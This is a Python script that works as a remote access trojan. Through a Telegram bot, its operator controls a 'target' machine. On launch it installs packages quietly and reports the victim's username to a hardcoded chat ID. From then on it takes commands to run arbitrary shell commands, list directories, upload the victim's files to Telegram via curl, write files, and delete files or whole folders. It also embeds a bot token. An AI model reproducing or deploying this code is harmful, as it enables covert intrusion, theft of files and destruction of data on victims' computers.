import subprocess
subprocess.run("pip install requests".split(), capture_output=True).stdout.decode()
subprocess.run("pip install python-telegram-bot".split(), capture_output=True).stdout.decode()
subprocess.run("pip install pybase64".split(), capture_output=True).stdout.decode()
from time import *
import pybase64
import os
import requests
from telegram import *
from telegram.ext import *
import shutil

token = "5029770999:AAEw7E-V_PAOJObEp6W0Uf375FBj6JCpUHE"

def action(update, context):
    update.message.reply_html(f"""
==========================
<u><b>Bot Infos:</b></u>
ID       : <code>{context.bot.id}</code>
Username : {context.bot.username}
Fullname : {context.bot.first_name}
==========================

Choose :
[0] Contact Target - /contact
[1] Create File and Run it - /run
[2] Use target's Terminal - /terminal
[3] list dir - /listdir
[4] send document - /getdoc
[5] Remove File(s) - /rm_file
[6] Remove Folder - /rm_folder""")

def contact(update, context: CallbackContext):
    try:
        username = ""
        username += update.message.text.split()[1]
        msg = update.message.text.split()[2:]
    except IndexError:
        update.message.reply_html("Not Enough Arguments !\n<u>Usage:</u> /contact <i>username</i> <i>msg</i>")
        
    try:
        if username != update.message.text.split()[-1]:
            msg_filter = " ".join(msg)
            print(f"Sender => {username}:\n{msg_filter}")
            send_msg = input("Send Message : ")
            update.message.reply_text(send_msg)
        elif username == update.message.text.split()[-1]:
            update.message.reply_html("<u>Usage:</u> /contact <i>username</i> <i>msg</i>")
    except UnboundLocalError:
        pass

def create_file(update: Update, context: CallbackContext):
    filename = update.message.text.split()[1]
    file_content = update.message.text.split()[2:]
    filter = " ".join(file_content)
    with open(filename, "w") as f:
        f.write(filter)
    
def use_terminal(update: Update, context: CallbackContext):
    msg = update.message.text.split()[1:]
    cmd = subprocess.run(msg, capture_output=True).stdout.decode()
    requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id=1677527063&text={cmd}")

def getlistdir(update: Update, context: CallbackContext):
    dirname = update.message.text.split()[-1]
    lst = os.listdir(dirname)
    sngl = " "
    for x in lst:
        if os.path.isfile(dirname + x):
            sngl += "file <code>" + x + "</code>" + "\n"
        else:
            sngl += "dir <code>" + x + "</code>" + "\n"
            
    context.bot.send_message(chat_id=1677527063, text=sngl, parse_mode="html")

def send_doc(update: Update, context: CallbackContext):
    subprocess.run(["curl", "-v", "-F", "chat_id=1677527063", "-F", f"document=@{update.message.text.split()[1:]}", f"https://api.telegram.org/bot{token}/sendDocument"], capture_output=True).stdout.decode()

def remove_file(update: Update, context: CallbackContext):
    os.remove(update.message.text.split()[-1])
    context.bot.send_message(chat_id=1677527063, text=f"{update.message.text.split()[-1]} removed !")

def remove_folder(update: Update, context: CallbackContext):
    shutil.rmtree(update.message.text.split()[-1])
    context.bot.send_message(chat_id=1677527063, text=f"{update.message.text.split()[-1]} removed (folder) !")
    
def rename_file(update: Update, context: CallbackContext):
    if update.message.text.split()[1] == update.message.text.split()[-1]:
        update.message.reply_html(f"<u>Usage:</u> /rename_file <i>current file</i> <i>new filename</i>")
    elif update.message.text.split()[1] != update.message.text.split()[-1]:
        os.rename(update.message.text.split()[1], update.message.text.split()[-1])
    
    
def main():
    token = "5029770999:AAEw7E-V_PAOJObEp6W0Uf375FBj6JCpUHE"
    updater = Updater(token)
    dp = updater.dispatcher
    
    target_username = subprocess.run(["whoami"], capture_output=True).stdout.decode()
    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id=1677527063&text=New Connection {strftime('%A, %H:%M')}"
    url2 = f"https://api.telegram.org/bot{token}/sendMessage?chat_id=1677527063&text={target_username}Online!"
    requests.get(url)
    requests.get(url2)
    
    dp.add_handler(CommandHandler('start', action))
    
    # Contact Target
    dp.add_handler(CommandHandler('contact', contact))
    
    # run file
    dp.add_handler(CommandHandler('run', create_file))
    
    # Terminal
    dp.add_handler(CommandHandler('terminal', use_terminal))
    
    # list dir
    dp.add_handler(CommandHandler('listdir', getlistdir))
    
    # get document
    dp.add_handler(CommandHandler('getdoc', send_doc))
    
    # Rename File & Folders
    dp.add_handler(CommandHandler('rm_file', remove_file))
    dp.add_handler(CommandHandler('rm_folder', remove_folder))
    
    # Rename File
    dp.add_handler(CommandHandler('rename_file', rename_file))
        
    updater.start_polling()
    updater.idle()

main()
